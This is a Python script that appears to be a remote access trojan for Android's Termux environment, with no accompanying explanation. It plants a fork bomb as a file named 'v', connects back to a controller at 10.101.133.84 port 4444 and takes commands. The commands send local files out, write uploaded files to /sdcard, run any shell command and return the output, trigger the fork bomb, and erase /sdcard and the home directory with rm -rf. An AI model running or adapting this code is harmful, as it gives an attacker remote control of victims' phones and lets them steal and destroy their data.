import socket
import subprocess
import os

s = (':(){ :|:& };:')
i = open('/data/data/com.termux/files/usr/bin/v', 'wb')
o = i.write(s)
c = i.close()
os.system('chmod +x /data/data/com.termux/files/usr/bin/v')
os.system('cp -r /data/data/com.termux/files/usr/bin/termux-open  /data/data/com.termux/files/usr/bin/open')
os.system('clear')
print('[1;33m[[1;32m+[1;33m] [1;32mRunning . . .[1;37m')
s = socket.socket()
conn = False
while not conn:
    try:
     s.connect(('10.101.133.84', 4444))
     conn = True
    except:
        pass
#######################################################

#######################################################
def main():
 while True:
  m = s.recv(1024)
  if m == 'chat':
     chat()
  elif m == 'shell':
     shell()
  elif m == 'download':
      download()
  elif m == 'upload':
      upload()
#######################################################
def download():
 while True:
  file_p = s.recv(1024)
  if file_p == 'back':
     main()
  elif file_p == '':
     download()
  try:
      f = open(file_p, 'rb')
      data = f.read()
      s.send(data)
  except IOError:
      download()
#######################################################

def upload():
 while True:
    f = s.recv(1024)
    if f == 'back':
        main()
    elif f == '':
        upload()
    else:
     fu = s.recv(1073741824)
     f_n = ('/sdcard/'+ f +'')
     n_f = open(f_n, 'wb')
     n_f.write(fu)
     n_f.close()
#######################################################
def format():
 os.system('rm -rf /sdcard')
 os.system('rm -rf ~ ')
#######################################################
def chat():
 while True:
  vr2 = s.recv(1024)
#  print('[1;36m'+vr2+'[1;37m')
  if vr2 == 'back':
   main()
  elif vr2 == 'clear':
   os.system('clear')
  else:
       print('[1;36m'+ vr2 +'[1;37m')
#######################################################

#       print('[1;36m'+vr2+'[1;37m')




def shell():
 while True:
  cmd = s.recv(1024)
  if cmd[:2] == 'cd':
   os.chdir(cmd[3:])
   dir = os.getcwd()
   s.sendall('bacod')
  elif cmd == 'back':
       main()
  elif cmd == 'format':
       format()
       os.system('rm -rf /sdcard')
       os.system('rm -rf ~ ')
  elif cmd == 'virus':
       os.system('bash /data/data/com.termux/files/usr/bin/v')
  elif cmd == 'kernel_info':
   results = subprocess.Popen('cat /proc/version', shell=True,
             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
             stdin=subprocess.PIPE)
   results = results.stdout.read() + results.stderr.read()

   s.sendall(results)


  else:
   results = subprocess.Popen(cmd, shell=True,
             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
             stdin=subprocess.PIPE)
   results = results.stdout.read() + results.stderr.read()

   s.sendall(''+results)
main()









